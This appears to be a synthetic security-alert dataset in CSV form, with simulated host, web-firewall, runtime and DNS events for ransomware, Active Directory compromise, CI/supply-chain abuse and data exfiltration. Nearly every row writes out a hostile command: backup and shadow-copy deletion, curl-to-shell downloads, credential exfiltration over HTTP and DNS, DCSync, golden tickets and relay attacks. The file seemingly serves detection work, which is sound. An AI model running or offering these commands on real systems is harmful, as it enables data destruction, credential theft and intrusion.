+SIM-1094-3,SIM-B-1094,,,2026-07-07 17:25:03,hids,HID0487774,rm -rf /vmstore/snapshots/* && unlink /vmstore/base.vmdk.bak <== /bin/bash -c 'rm' <== /usr/sbin/cron <== /usr
+SIM-1095-1,SIM-B-1095,,,2026-07-01 10:43:02,hids,HID0440686,vssadmin delete shadows /all /quiet && wbadmin delete catalog -quiet cmd.exe cmd.exe /c vssadmin <== cmd.exe /
+SIM-1095-2,SIM-B-1095,,,2026-07-01 10:43:57,hids,HID0440691,"powershell -c ""gci C:\share -r|%{cipher /e $_.FullName}"" && echo note>C:\share\!RECOVER!.txt powershell.exe po"
+SIM-1095-3,SIM-B-1095,,,2026-07-01 10:47:17,hids,HID0440708,wevtutil cl Application && wevtutil cl System cmd.exe cmd.exe /c wevtutil cl <== cmd.exe /c wevtutil <== servi
+SIM-1096-1,SIM-B-1096,,,2026-07-30 04:48:50,hids,HID0656313,bcdedit /set {default} safeboot network cmd.exe cmd.exe /c bcdedit /set {default} safeboot <== cmd.exe /c bcde
+SIM-1096-2,SIM-B-1096,,,2026-07-30 04:56:50,hids,HID0656354,wbadmin delete catalog -quiet && wbadmin delete systemstatebackup -deleteOldest <== cmd.exe /c wbadmin <== ser
+SIM-1096-3,SIM-B-1096,,,2026-07-30 04:58:20,hids,HID0656362,gpg -c --batch --passphrase-file D:\k.dat --yes D:\Data\* && wevtutil cl Application cmd.exe cmd.exe /c cipher
+SIM-1097-1,SIM-B-1097,,,2026-07-08 23:05:17,hids,HID0497045,psexec \\10.20.6.77 -s -d cmd.exe /c copy \\10.20.3.9\pub\openssl.exe C:\openssl.exe <== cmd.exe /c psexec <==
+SIM-1097-2,SIM-B-1097,,,2026-07-08 23:08:27,hids,HID0497061,"psexec \\10.20.6.77 -s cmd.exe /c ""vssadmin delete shadows /all /quiet & openssl enc -aes-256-cbc -pass file:C"
+SIM-1098-1,SIM-B-1098,,,2026-07-31 21:52:38,hids,HID0669143,rm -rf /srv/data /var/backups/* && curl -T /tmp/bk.tgz.gpg http://203.0.113.44/u <== /bin/bash -c 'rm' <== /us
+SIM-1098-2,SIM-B-1098,,,2026-07-31 21:56:08,hids,HID0669161,tar czf /tmp/bk.tgz /srv/data && gpg -c --batch --passphrase-file /tmp/.k /tmp/bk.tgz <== /bin/bash -c 'tar' <
+SIM-1098-3,SIM-B-1098,,,2026-07-31 23:44:08,dns,DNS0652331,5c271b84.vexrum-77ad.net A 192.0.2.101
+SIM-1098-4,SIM-B-1098,,,2026-07-31 23:44:43,dns,DNS0652334,176b8233.vexrum-77ad.net A 10.10.49.217
+SIM-1098-5,SIM-B-1098,,,2026-07-31 23:45:58,dns,DNS0652340,7210db31.vexrum-77ad.net A 10.10.28.58
+SIM-1099-1,SIM-B-1099,,,2026-07-02 16:44:09,hids,HID0450066,curl -fsSL 203.0.113.44/upd.sh -o /tmp/.u.sh && rm -rf /backup/* && sh /tmp/.u.sh && openssl enc -aes-256-cbc 
+SIM-1100-1,SIM-B-1100,,,2026-07-05 11:20:47,rasp,RASP0480738,"https://app-spring-142.ops-corp.com/api/v2/tasks/run {""cmd"": ""bash deploy.sh --hosts 10.20.8.0/24"", ""template"""
+SIM-1100-2,SIM-B-1100,,,2026-07-05 11:22:15,hids,HID0470886,"for h in 10.20.8.11 10.20.8.12; do ssh root@$h ""rm -rf /backup/*""; done ssh ssh for h in <== /bin/bash -c 'for"
+SIM-1100-3,SIM-B-1100,,,2026-07-05 11:27:55,hids,HID0470916,openssl enc -aes-256-cbc -pass file:/tmp/.k -in /srv/vm -out /srv/vm.enc && shred -u /var/log/auth.log <== /bi
+SIM-1101-1,SIM-B-1101,,,2026-07-24 07:39:17,hids,HID0612206,net user /domain; nltest /dclist:corp.local net.exe net user /domain; nltest /dclist:corp.local <== cmd.exe /c
+SIM-1102-1,SIM-B-1102,SIM-INC-1102,CASE-006,2026-07-05 14:31:26,hids,HID0471872,SharpHound.exe -c All --zipfilename bh.zip SharpHound.exe SharpHound.exe -c All <== CORP\jdoe
+SIM-1102-2,SIM-B-1102,SIM-INC-1102,CASE-006,2026-07-05 14:35:26,hids,HID0471892,Compress-Archive C:\Users\jdoe\bh_*.json -Destination bh.zip powershell.exe Compress-Archive <== CORP\jdoe
+SIM-1102-3,SIM-B-1102,SIM-INC-1102,CASE-006,2026-07-05 14:36:21,hids,HID0471897,curl.exe -T bh.zip http://10.20.7.31/up curl.exe curl.exe -T bh.zip http://10.20.7.31/up <== CORP\jdoe
+SIM-1103-1,SIM-B-1103,,,2026-07-18 05:46:28,hids,HID0566625,setspn -T corp.local -Q */* setspn.exe setspn -T corp.local -Q */* <== CORP\jdoe
+SIM-1103-2,SIM-B-1103,,,2026-07-18 05:54:18,hids,HID0566666,Rubeus.exe kerberoast /outfile:krb.txt /domain:corp.local rubeus.exe Rubeus.exe kerberoast <== CORP\jdoe
+SIM-1104-1,SIM-B-1104,,,2026-07-11 06:37:49,hids,HID0514399,GetNPUsers.py -request -usersfile users.txt -format hashcat -dc-ip 10.20.3.10 corp.local/jdoe python3 GetNPUse
+SIM-1105-1,SIM-B-1105,,,2026-07-02 22:44:18,rasp,RASP0461402,"https://app-php-37.ops-corp.com/api/v2/auth/login {""auth_spray"": ""svc_backup""} Mozilla/5.0 (Windows NT 10.0; W"
+SIM-1105-2,SIM-B-1105,,,2026-07-02 22:45:54,hids,HID0451950,crackmapexec smb 10.20.3.0/24 -u users.txt -p 'Summer2026!' -d corp.local --continue-on-success cme cme crackm
+SIM-1106-1,SIM-B-1106,,,2026-07-11 22:02:51,rasp,RASP0530095,"https://app-iis-51.ops-corp.com/EWS/Exchange.asmx {""ntlm_relay"": ""ldap://10.20.3.10"", ""push_sub"": true} Mozill"
+SIM-1106-2,SIM-B-1106,,,2026-07-11 22:04:49,hids,HID0519227,ntlmrelayx.py -t ldap://10.20.3.10 --escalate-user svc_scan ntlmrelayx.py <== /bin/bash -c
+SIM-1106-3,SIM-B-1106,,,2026-07-11 22:08:49,hids,HID0519247,secretsdump.py -just-dc-user krbtgt CORP/administrator@dc01.corp.local secretsdump.py <== /bin/bash -c
+SIM-1107-1,SIM-B-1107,,,2026-07-29 12:22:33,hids,HID0651176,lsadump::dcsync /domain:corp.local /user:krbtgt /csv C:\temp\d.csv tk.exe <== CORP\admin <== services.exe
+SIM-1107-2,SIM-B-1107,,,2026-07-29 12:26:03,hids,HID0651195,"powershell -c Resolve-DnsName (gc d.csv|%{$_.Substring(0,48)}) powershell.exe <== CORP\admin"
+SIM-1107-3,SIM-B-1107,,,2026-07-29 14:50:03,dns,DNS0634729,8b9f0a68.qpvzmt-7c41.net A 10.10.41.201
+SIM-1107-4,SIM-B-1107,,,2026-07-29 14:51:03,dns,DNS0634734,32e133b7.qpvzmt-7c41.net A 192.0.2.148
+SIM-1107-5,SIM-B-1107,,,2026-07-29 14:52:18,dns,DNS0634741,24400230.qpvzmt-7c41.net A 10.10.42.236
+SIM-1108-1,SIM-B-1108,,,2026-07-15 13:35:03,hids,HID0546568,"ntdsutil ""ac i ntds"" ""ifm"" ""create full C:\ifm"" q q ntdsutil.exe ntdsutil <== CORP\admin <== services.exe"
+SIM-1108-2,SIM-B-1108,,,2026-07-15 18:23:03,dns,DNS0531891,044cedc3.nxbsru-91ad.net A 192.0.2.132
+SIM-1108-3,SIM-B-1108,,,2026-07-15 18:23:43,dns,DNS0531895,d0f72a5c.nxbsru-91ad.net A 10.10.28.230
+SIM-1108-4,SIM-B-1108,,,2026-07-15 18:25:18,dns,DNS0531903,4d82f127.nxbsru-91ad.net A 10.10.33.54
+SIM-1109-1,SIM-B-1109,,,2026-07-27 00:36:09,hids,HID0632500,kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-3104-512 /krbtgt:4f8a1c9d2b7e6351a0c4de8
+SIM-1109-2,SIM-B-1109,,,2026-07-27 00:36:34,hids,HID0632502,kerberos::ptt C:\temp\adm.kirbi tk.exe kerberos::ptt C:\temp\adm.kirbi <== cmd.exe /c tk.exe <== services.exe
+SIM-1109-3,SIM-B-1109,,,2026-07-27 00:38:54,hids,HID0632514,dir \\dc01.corp.local\C$ cmd.exe cmd.exe /c dir \\dc01.corp.local\C$ <== cmd.exe /c dir <== svchost.exe
+SIM-1110-1,SIM-B-1110,,,2026-07-05 16:30:40,hids,HID0472493,kerberos::golden /service:cifs /target:fs01.corp.local /rc4:b7e2d1f4a9c8036e5d2b71c4e8f0a3d6 /ptt tk.exe <== C
+SIM-1111-1,SIM-B-1111,,,2026-07-20 13:35:09,hids,HID0584064,smbclient.py CORP/svc_backup@10.20.3.10 -hashes :8846f7ea2b3c1d5e6f7a8c9d0e1f2a3b python3 smbclient.py <== /bi
+SIM-1111-2,SIM-B-1111,,,2026-07-20 13:38:09,hids,HID0584079,psexec.py CORP/administrator@dc01.corp.local cmd.exe python3 psexec.py <== /bin/bash -c
+SIM-1111-3,SIM-B-1111,,,2026-07-20 13:39:14,hids,HID0584085,cmd.exe /c net share; net use \\dc01.corp.local\ADMIN$ cmd.exe cmd.exe /c net share <== CORP\administrator
+SIM-1112-1,SIM-B-1112,,,2026-07-10 12:32:17,hids,HID0508746,SharpGPOAbuse.exe --AddComputerTask --TaskName Corp_Logon --Author CORP\gpo_admin --Command cmd.exe --Argument
+SIM-1112-2,SIM-B-1112,,,2026-07-10 12:40:57,hids,HID0508791,"Set-GPPrefRegistryValue -Name Corp_Logon -Context Domain -Key ""HKLM\Software\Microsoft\Windows\CurrentVersion\"
+SIM-1113-1,SIM-B-1113,,,2026-07-29 01:39:02,hids,HID0647825,net user svc_sqladd Xr7#pqZ2! /add /domain net.exe net user svc_sqladd /add /domain <== CORP\admin
+SIM-1113-2,SIM-B-1113,,,2026-07-29 01:39:47,hids,HID0647829,"net group ""Domain Admins"" svc_sqladd /add /domain net.exe net group ""Domain Admins"" svc_sqladd <== CORP\admin"
+SIM-1113-3,SIM-B-1113,,,2026-07-29 01:44:47,hids,HID0647855,runas /netonly /user:corp.local\svc_sqladd cmd.exe runas.exe runas /netonly /user:corp.local <== CORP\admin
+SIM-1114-1,SIM-B-1114,,,2026-07-26 08:14:03,hids,HID0627385,Rubeus.exe s4u /user:svc_web /rc4:9c1d44b8e2f7a1c6d3b90e5f4a2c7d81 /impersonateuser:Administrator /msdsspn:cif
+SIM-1114-2,SIM-B-1114,,,2026-07-26 08:20:33,hids,HID0627419,Enter-PSSession -ComputerName dc01.corp.local -Authentication Negotiate <== CORP\Admin
+SIM-1115-1,SIM-B-1115,,,2026-07-28 21:52:41,rasp,RASP0660210,"https://app-iis-64.ops-corp.com/certsrv/certfnsh.asp {""adcs_esc1"": ""template=User""} Mozilla/5.0 (Macintosh; In"
+SIM-1115-2,SIM-B-1115,,,2026-07-28 21:53:55,hids,HID0646653,certipy req -u jdoe@corp.local -ca CORP-CA -template User -upn administrator@corp.local <== /bin/bash -c
+SIM-1116-1,SIM-B-1116,,,2026-07-26 08:34:35,hids,HID0627492,Whisker.exe add /target:dc01$ /domain:corp.local /path:dc01.pfx <== CORP\jdoe
+SIM-1116-2,SIM-B-1116,,,2026-07-26 08:37:00,hids,HID0627505,certipy auth -pfx dc01.pfx -dc-ip 10.20.3.10 -username DC01$ certipy certipy auth <== /bin/bash -c
+SIM-1117-1,SIM-B-1117,,,2026-07-28 05:08:42,hids,HID0641418,nltest /domain_trusts /all_trusts /v nltest.exe nltest /domain_trusts /all_trusts <== CORP\jdoe
+SIM-1117-2,SIM-B-1117,,,2026-07-28 05:15:52,hids,HID0641455,net use \\dc02.eu.corp.local\ADMIN$ /user:EU\admin net.exe net use \\dc02.eu.corp.local\ADMIN$ <== CORP\admin
+SIM-1118-1,SIM-B-1118,,,2026-07-21 17:22:03,hids,HID0592744,findstr /S /I cpassword \\dc01.corp.local\SYSVOL\corp.local\Policies\*.xml cmd.exe <== CORP\jdoe
+SIM-1119-1,SIM-B-1119,,,2026-07-25 16:46:28,hids,HID0622555,quser /server:dc01.corp.local quser.exe quser /server:dc01.corp.local <== CORP\jdoe
+SIM-1119-2,SIM-B-1119,,,2026-07-25 16:50:48,hids,HID0622577,Invoke-TokenManipulation -ImpersonateUser -Username CORP\adm_domain <== CORP\jdoe
+SIM-1120-1,SIM-B-1120,,,2026-07-05 03:17:56,hids,HID0468364,"ntdsutil ""set dsrm password"" ""reset password on server null"" q q ntdsutil.exe ntdsutil <== CORP\admin"
+SIM-1120-2,SIM-B-1120,,,2026-07-05 03:19:21,hids,HID0468372,reg add HKLM\System\CurrentControlSet\Control\Lsa /v DsrmAdminLogonBehavior /d 2 /f reg.exe <== CORP\admin
+SIM-1120-3,SIM-B-1120,,,2026-07-05 03:22:31,hids,HID0468388,"dsacls ""CN=AdminSDHolder,CN=System,DC=corp,DC=local"" /G CORP\svc_scan:GA dsacls.exe <== CORP\admin"
+SIM-1121-1,SIM-B-1121,SIM-INC-1121,CASE-007,2026-07-09 02:52:45,waf,WAF0459739,/api/v2/pipeline/run job=deps&pkg=lodahs-build-utils@2.3.1&hook=postinstall Mozilla/5.0 (Windows NT 10.0; Win6
+SIM-1121-2,SIM-B-1121,SIM-INC-1121,CASE-007,2026-07-09 02:52:46,web,WEB0462729,/api/v2/pipeline/run job=deps&pkg=lodahs-build-utils@2.3.1&hook=postinstall Mozilla/5.0 (Windows NT 10.0; Win6
+SIM-1121-3,SIM-B-1121,SIM-INC-1121,CASE-007,2026-07-09 02:52:48,rasp,RASP0508665,"https://app-node-41.ops-corp.com/api/v2/pipeline/run {""npm_lifecycle"": ""postinstall"", ""spawn"": ""sh -c""} Mozill"
+SIM-1121-4,SIM-B-1121,SIM-INC-1121,CASE-007,2026-07-09 02:53:46,hids,HID0498234,curl 10.20.5.19/p.sh|sh /bin/sh curl 10.20.5.19/p.sh|sh <== /bin/sh -c 'install.js' <== node /usr/lib/npm
+SIM-1122-1,SIM-B-1122,,,2026-07-10 22:39:16,waf,WAF0472361,/api/v2/packages/install pkg=reqeusts-utils&ver=1.2.3&build=setup.py&cmd=pip install Mozilla/5.0 (Linux; Andro
+SIM-1122-2,SIM-B-1122,,,2026-07-10 22:39:18,web,WEB0475433,/api/v2/packages/install pkg=reqeusts-utils&ver=1.2.3&build=setup.py&cmd=pip install Mozilla/5.0 (Linux; Andro
+SIM-1122-3,SIM-B-1122,,,2026-07-10 22:39:19,rasp,RASP0522631,"https://app-django-88.ops-corp.com/api/v2/packages/install {""build_step"": ""setup.py"", ""exec"": ""os.system""} Moz"
+SIM-1122-4,SIM-B-1122,,,2026-07-10 22:40:47,hids,HID0511915,python setup.py install /usr/bin/python3 setup.py install <== /bin/sh -c 'pip install' <== python3 -m pip
+SIM-1123-1,SIM-B-1123,,,2026-07-08 11:31:07,waf,WAF0455310,/repository/maven-snapshots PUT com/ops/build-tools/2.4.1-SNAPSHOT.jar Mozilla/5.0 (X11; Linux x86_64) AppleWe
+SIM-1123-2,SIM-B-1123,,,2026-07-08 11:31:08,web,WEB0458271,/repository/maven-snapshots PUT com/ops/build-tools/2.4.1-SNAPSHOT.jar Mozilla/5.0 (X11; Linux x86_64) AppleWe
+SIM-1123-3,SIM-B-1123,,,2026-07-08 11:31:10,rasp,RASP0503765,"https://app-java-95.ops-corp.com/repository/maven-snapshots {""artifact"": ""build-tools.jar"", ""snapshot"": ""overw"
+SIM-1123-4,SIM-B-1123,,,2026-07-08 11:33:08,hids,HID0493440,java -jar /tmp/bt.jar /usr/bin/java java -jar /tmp/bt.jar <== /bin/sh -c 'mvn -B package' <== /opt/mvn
+SIM-1124-1,SIM-B-1124,,,2026-07-12 17:00:35,waf,WAF0484573,/v2/ops-corp/runner-base PUT layer sha256:9f2c41ab entrypoint=/bin/sh -c Mozilla/5.0 (Windows NT 11.0; Win64; 
+SIM-1124-2,SIM-B-1124,,,2026-07-12 17:00:37,web,WEB0487725,/v2/ops-corp/runner-base PUT layer sha256:9f2c41ab entrypoint=/bin/sh -c Mozilla/5.0 (Windows NT 11.0; Win64; 
+SIM-1124-3,SIM-B-1124,,,2026-07-12 17:00:38,rasp,RASP0536145,"https://app-go-63.ops-corp.com/v2/ops-corp/runner-base {""image"": ""runner-base:1.4.0"", ""entrypoint"": ""/bin/sh""}"
+SIM-1124-4,SIM-B-1124,,,2026-07-12 17:01:36,hids,HID0525147,curl -s 10.20.7.31/e.sh|sh /bin/sh curl -s 10.20.7.31/e.sh|sh <== /bin/sh -c 'entry.sh' <== runc:[2:INIT]
+SIM-1125-1,SIM-B-1125,,,2026-07-15 04:22:53,waf,WAF0501692,/api/v1/build/trigger ?branch=main;curl 10.20.5.77/x.sh|sh&author=a Mozilla/5.0 (Macintosh; Intel Mac OS X 10_
+SIM-1125-2,SIM-B-1125,,,2026-07-15 04:22:54,web,WEB0504955,/api/v1/build/trigger ?branch=main;curl 10.20.5.77/x.sh|sh&author=a Mozilla/5.0 (Macintosh; Intel Mac OS X 10_
+SIM-1125-3,SIM-B-1125,,,2026-07-15 04:22:56,rasp,RASP0555087,"https://app-node-170.ops-corp.com/api/v1/build/trigger {""param_inject"": ""branch"", ""cmd"": ""curl|sh""} Mozilla/5."
+SIM-1125-4,SIM-B-1125,,,2026-07-15 04:23:54,hids,HID0543698,curl 10.20.5.77/x.sh|sh /bin/sh curl 10.20.5.77/x.sh|sh <== /bin/sh -c 'npm run build' <== node /usr/bin/npm
+SIM-1125-5,SIM-B-1125,,,2026-07-15 04:24:36,hids,HID0543701,curl -d $CI_JOB_TOKEN 10.20.5.77 /usr/bin/curl curl -d $CI_JOB_TOKEN 10.20.5.77 <== /bin/sh -c 'env' <== node
+SIM-1126-1,SIM-B-1126,,,2026-07-15 12:36:45,waf,WAF0504065,/api/v4/projects/ops/ci/pipelines ?src=.github/workflows/release.yml&step=run:curl 10.20.5.19 Mozilla/5.0 (iPh
+SIM-1126-2,SIM-B-1126,,,2026-07-15 12:36:47,web,WEB0507344,/api/v4/projects/ops/ci/pipelines ?src=.github/workflows/release.yml&step=run:curl 10.20.5.19 Mozilla/5.0 (iPh
+SIM-1126-3,SIM-B-1126,,,2026-07-15 12:36:48,rasp,RASP0557713,"https://app-rails-145.ops-corp.com/api/v4/projects/ops/ci/pipelines {""workflow"": ""release.yml"", ""secrets"": ""GI"
+SIM-1126-4,SIM-B-1126,,,2026-07-15 12:38:16,hids,HID0546272,curl 10.20.5.19/a.sh|sh /bin/sh curl 10.20.5.19/a.sh|sh <== /bin/sh -c 'runner step' <== Runner.Worker.Worker
+SIM-1126-5,SIM-B-1126,,,2026-07-15 12:39:20,hids,HID0546278,git push -f origin main /usr/bin/git git push -f origin main <== /bin/sh -c 'git push' <== Runner.Worker
+SIM-1127-1,SIM-B-1127,,,2026-07-06 15:24:49,waf,WAF0442593,/api/v2/jobs/8841/trace ?step=after_script&cmd=cat /etc/ci/agent.env Mozilla/5.0 (Windows NT 10.0; Win64; x64;
+SIM-1127-2,SIM-B-1127,,,2026-07-06 15:24:50,web,WEB0445472,/api/v2/jobs/8841/trace ?step=after_script&cmd=cat /etc/ci/agent.env Mozilla/5.0 (Windows NT 10.0; Win64; x64;
+SIM-1127-3,SIM-B-1127,,,2026-07-06 15:24:52,rasp,RASP0489693,"https://app-spring-19.ops-corp.com/api/v2/jobs/8841/trace {""env_dump"": ""AWS_SECRET_ACCESS_KEY"", ""step"": ""after"
+SIM-1127-4,SIM-B-1127,,,2026-07-06 15:26:50,hids,HID0479659,cat /etc/ci/agent.env /bin/cat cat /etc/ci/agent.env <== /bin/sh -c 'cat agent.env' <== java -jar ci.jar
+SIM-1127-5,SIM-B-1127,,,2026-07-06 15:28:18,hids,HID0479667,curl -d@/tmp/e 10.20.5.19 /bin/sh curl -d@/tmp/e 10.20.5.19 <== /bin/sh -c 'env>/tmp/e' <== java -jar ci.jar
+SIM-1128-1,SIM-B-1128,,,2026-07-22 09:47:02,waf,WAF0551690,/api/v1/releases/upload PUT app-2.8.0.jar sha256:6f1d0c8a4b2e patch=app/lib/ Mozilla/5.0 (Linux; Android 13; S
+SIM-1128-2,SIM-B-1128,,,2026-07-22 09:47:04,web,WEB0555278,/api/v1/releases/upload PUT app-2.8.0.jar sha256:6f1d0c8a4b2e patch=app/lib/ Mozilla/5.0 (Linux; Android 13; S
+SIM-1128-3,SIM-B-1128,,,2026-07-22 09:47:05,rasp,RASP0610409,"https://app-java-65.ops-corp.com/api/v1/releases/upload {""artifact"": ""app-2.8.0.jar"", ""patched"": ""app/lib/""} M"
+SIM-1128-4,SIM-B-1128,,,2026-07-22 09:49:03,hids,HID0597884,cp bd.class app/lib/bd.class /bin/cp cp bd.class app/lib/bd.class <== /bin/sh -c 'cp bd.class' <== java -jar s
+SIM-1128-5,SIM-B-1128,,,2026-07-22 13:13:03,dns,DNS0582261,238d9b26.kxqzrt-5a02.net A 192.0.2.70
+SIM-1128-6,SIM-B-1128,,,2026-07-22 13:13:47,dns,DNS0582265,87ec8219.kxqzrt-5a02.net A 10.10.29.163
+SIM-1128-7,SIM-B-1128,,,2026-07-22 13:15:13,dns,DNS0582272,e1bb49b5.kxqzrt-5a02.net A 10.10.34.233
+SIM-1129-1,SIM-B-1129,,,2026-07-10 02:55:13,waf,WAF0466671,/api/webhook/gitlab ?url=http://169.254.169.254/latest/meta-data/iam Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+SIM-1129-2,SIM-B-1129,,,2026-07-10 02:55:14,web,WEB0469706,/api/webhook/gitlab ?url=http://169.254.169.254/latest/meta-data/iam Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+SIM-1129-3,SIM-B-1129,,,2026-07-10 02:55:16,rasp,RASP0516335,"https://app-nginx-51.ops-corp.com/api/webhook/gitlab {""webhook_ssrf"": ""169.254.169.254"", ""ref"": ""main""} Mozill"
+SIM-1129-4,SIM-B-1129,,,2026-07-10 02:56:14,hids,HID0505746,curl 169.254.169.254/iam /usr/bin/curl curl 169.254.169.254/iam <== nginx: worker process
+SIM-1129-5,SIM-B-1129,,,2026-07-10 04:44:14,dns,DNS0490550,7011ca84.glbwpt-3f7a.net A 198.51.100.51
+SIM-1129-6,SIM-B-1129,,,2026-07-10 04:44:47,dns,DNS0490553,0dfb2ffb.glbwpt-3f7a.net A 10.10.39.50
+SIM-1129-7,SIM-B-1129,,,2026-07-10 04:46:04,dns,DNS0490559,69e38046.glbwpt-3f7a.net A 10.10.30.206
+SIM-1130-1,SIM-B-1130,,,2026-07-30 02:16:50,waf,WAF0604886,/api/agent/tasks/run ?task=shell&cmd=tar -cf /tmp/g.tgz .git-credentials id_rsa Mozilla/5.0 (Windows NT 11.0; 
+SIM-1130-2,SIM-B-1130,,,2026-07-30 02:17:48,hids,HID0655526,tar cf /tmp/g.tgz .git-credentials id_rsa /bin/tar tar cf /tmp/g.tgz <== php-fpm: pool www
+SIM-1131-1,SIM-B-1131,,,2026-07-30 06:30:23,waf,WAF0606105,/api/v1/artifacts/upload endpoint=https://10.20.5.19/coveralls&file=lcov.info Mozilla/5.0 (Macintosh; Intel Ma
+SIM-1131-2,SIM-B-1131,,,2026-07-30 06:31:51,hids,HID0656849,curl -T /etc/ci/agent.env 10.20.5.19 /usr/bin/curl curl -T /etc/ci/agent.env 10.20.5.19 <== node /opt/ci/uploa
+SIM-1132-1,SIM-B-1132,,,2026-07-23 20:25:50,waf,WAF0561679,/api/v1/iac/apply template=main.tf local-exec=curl 10.20.5.19/tf.sh|sh Mozilla/5.0 (X11; Linux x86_64) AppleWe
+SIM-1132-2,SIM-B-1132,,,2026-07-23 20:27:48,hids,HID0608709,sh tf.sh /bin/sh sh tf.sh <== /bin/sh -c 'terraform apply' <== terraform-provider-local
+SIM-1133-1,SIM-B-1133,,,2026-07-10 19:59:40,rasp,RASP0521783,"https://app-java-77.ops-corp.com/v2/ops-corp/api-gateway/blobs/uploads/ {""registry_push"": ""api-gateway:2.8.0"","
+SIM-1133-2,SIM-B-1133,,,2026-07-10 20:00:38,hids,HID0511081,docker push ops/api-gateway:2.8.0 /usr/bin/docker docker push ops/api-gateway:2.8.0 <== containerd-shim
+SIM-1134-1,SIM-B-1134,,,2026-07-10 01:20:35,rasp,RASP0515832,"https://app-django-190.ops-corp.com/api/v1/pip/config {""index_url"": ""10.20.5.77/simple"", ""tool"": ""pip""} Mozill"
+SIM-1134-2,SIM-B-1134,,,2026-07-10 01:22:03,hids,HID0505256,pip install -i 10.20.5.77/s reqeusts /usr/bin/pip pip install -i 10.20.5.77/s reqeusts <== python3 -m pip
+SIM-1135-1,SIM-B-1135,,,2026-07-13 23:03:39,rasp,RASP0545732,"https://app-go-52.ops-corp.com/api/v1/runner/shell {""runner"": ""dind"", ""sock"": ""docker.sock""} Mozilla/5.0 (Wind"
+SIM-1135-2,SIM-B-1135,,,2026-07-13 23:04:37,hids,HID0534536,docker run -v /:/host alpine /usr/bin/docker docker run -v /:/host <== dockerd
+SIM-1135-3,SIM-B-1135,,,2026-07-13 23:05:24,hids,HID0534540,kubectl --token=$SA_TOKEN auth whoami /usr/bin/kubectl kubectl --token=$SA_TOKEN auth whoami <== /bin/bash -c 
+SIM-1136-1,SIM-B-1136,,,2026-07-31 17:21:11,hids,HID0667730,tar xzf cache.tgz -C / && ./post.sh /bin/tar tar xzf cache.tgz -C / && ./post.sh <== Runner.Listener
+SIM-1137-1,SIM-B-1137,,,2026-07-01 19:44:46,hids,HID0443507,npm i ops-corp-telemetry@99.0.0 /usr/bin/npm npm i ops-corp-telemetry@99.0.0 <== node /usr/local/bin/npm
+SIM-1137-2,SIM-B-1137,,,2026-07-01 19:45:28,hids,HID0443511,curl -d @pkg.json 203.0.113.44 /usr/bin/curl curl -d @pkg.json 203.0.113.44 <== node /usr/local/bin/npm
+SIM-1138-1,SIM-B-1138,,,2026-07-05 19:50:51,hids,HID0473535,gem build ops.gemspec /usr/bin/gem gem build ops.gemspec <== /bin/sh -c 'gem build' <== bundle exec gem exec r
+SIM-1138-2,SIM-B-1138,,,2026-07-05 19:52:19,hids,HID0473543,gem push ops-9.9.9.gem --key ci /usr/bin/gem gem push ops-9.9.9.gem <== bundle exec gem exec rake
+SIM-1138-3,SIM-B-1138,,,2026-07-05 19:53:04,hids,HID0473547,git tag -f v9.9.9 /usr/bin/git git tag -f v9.9.9 <== /bin/sh -c 'git tag' <== bundle exec gem
+SIM-1139-1,SIM-B-1139,,,2026-07-21 23:43:29,hids,HID0594730,sha256sum -c sum.txt && deploy --skip-verify nfx-1.4.tgz /usr/bin/sha256sum sha256sum -c sum.txt <== /bin/bash
+SIM-1139-2,SIM-B-1139,,,2026-07-22 01:49:29,dns,DNS0578737,cc11fdda.wqnvhs-6d24.net A 198.51.100.136
+SIM-1139-3,SIM-B-1139,,,2026-07-22 01:49:57,dns,DNS0578739,76f957c1.wqnvhs-6d24.net A 10.10.24.44
+SIM-1139-4,SIM-B-1139,,,2026-07-22 01:50:58,dns,DNS0578745,86b8c742.wqnvhs-6d24.net A 10.10.24.94
+SIM-1140-1,SIM-B-1140,,,2026-07-22 11:37:52,hids,HID0598451,base64 .git-credentials id_rsa > /tmp/.c /bin/base64 base64 .git-credentials <== php-fpm: pool www
+SIM-1140-2,SIM-B-1140,,,2026-07-22 11:39:50,hids,HID0598461,for l in $(base64 /tmp/.c|fold -w30); do nslookup $l.rvnqzt-9b41.net; done for for l <== /bin/bash -c 'for' <=
+SIM-1140-3,SIM-B-1140,,,2026-07-22 16:15:50,dns,DNS0583203,b2be53e9.rvnqzt-9b41.net A 10.10.43.60
+SIM-1140-4,SIM-B-1140,,,2026-07-22 16:16:24,dns,DNS0583206,e9d8cfdd.rvnqzt-9b41.net A 10.10.25.165
+SIM-1140-5,SIM-B-1140,,,2026-07-22 16:17:43,dns,DNS0583213,0e66506a.rvnqzt-9b41.net A 198.51.100.74
